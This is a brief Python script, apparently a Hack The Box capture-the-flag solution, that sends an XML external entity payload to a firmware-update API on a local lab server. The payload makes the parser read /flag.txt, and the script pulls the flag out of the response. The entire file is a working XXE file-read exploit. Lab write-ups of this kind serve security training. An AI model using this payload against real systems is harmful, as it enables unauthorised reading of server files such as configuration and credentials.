import requests, re

host, port = '127.0.0.1', 1337
HOST = f'http://{host}:{port}'

def firmware_update(payload):
    r = requests.post(f'{HOST}/api/update', data=payload, headers={
        'Content-Type': 'application/xml'
    })
    return r.text

payload = '''<!DOCTYPE foo [<!ENTITY bar SYSTEM "/flag.txt"> ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&bar;</Version>
    </Firmware>
</FirmwareUpdateConfig>
'''

r = firmware_update(payload)
print(re.search(r'HTB\{[^}]*\}',r).group(0))